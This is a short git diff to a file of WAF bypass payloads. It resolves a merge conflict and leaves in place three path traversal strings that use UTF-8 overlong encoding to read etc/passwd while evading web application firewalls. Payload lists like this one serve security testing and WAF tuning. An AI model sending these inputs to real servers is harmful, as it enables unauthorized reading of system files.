@@ -1,13 +1,7 @@
 # WAF Bypass Payloads
-<<<<<<< Updated upstream
 # Advanced obfuscation techniques for evading Web Application Firewalls
 
 # Unicode/UTF-8 Overlong Encoding
-=======
-# Advanced obfuscation for evading WAFs
-
-# Unicode/UTF-8 overlong encoding
->>>>>>> Stashed changes
 ..%c0%af..%c0%af..%c0%afetc/passwd
 ..%c0%af..%c0%af..%c0%af..%c0%afetc/passwd
 ..%e0%80%af..%e0%80%afetc/passwd
